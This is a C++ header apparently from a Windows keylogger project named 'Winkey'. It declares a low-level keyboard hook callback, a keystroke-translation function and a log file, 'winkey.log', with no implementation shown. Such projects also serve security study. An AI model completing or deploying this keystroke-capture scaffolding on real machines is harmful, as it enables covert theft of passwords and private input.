#pragma once

#include "sdk.h"

#pragma comment(lib, "user32.lib")

#define LOG_FILE TEXT("winkey.log")

HANDLE gLogHandle;

class Winkey {
public:
	Winkey();
	~Winkey();

	int Hook();
	static LRESULT CALLBACK onKey(int code,
		WPARAM wParam,
		LPARAM lParam);
	static const char* solve(PKBDLLHOOKSTRUCT kbdEv);
};